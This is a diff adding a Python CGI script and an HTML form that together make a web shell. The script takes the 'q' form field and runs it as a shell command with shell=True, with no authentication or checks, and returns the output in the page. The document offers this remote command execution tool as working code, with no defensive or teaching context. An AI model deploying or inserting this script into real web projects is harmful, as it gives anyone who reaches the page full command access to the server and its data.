@@ -1,0 +1,37 @@
+#!/usr/bin/python3
+
+print("Content-type: text/html")
+print()
+
+import subprocess
+import cgi
+
+formdata = cgi.FieldStorage()
+data = formdata.getvalue("q")
+
+if data:
+    try:
+        output = subprocess.check_output(data, shell=True, stderr=subprocess.STDOUT, text=True)
+        print("<pre>")
+        print(output)
+        print("</pre>")
+    except subprocess.CalledProcessError as e:
+        print(f"<pre>Error: {e.output}</pre>")
+else:
+    print("<pre>Enter a command.</pre>")
+---------------------------------------------------
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Shell Command Execution</title>
+</head>
+<body>
+    <h1>Execute Shell Commands</h1>
+    <form action="/cgi-bin/cmd.py" method="post">
+        Enter your command: <input type="text" name="q">
+        <br>
+        <input type="submit" value="Execute">
+    </form>
+</body>
+</html>
+
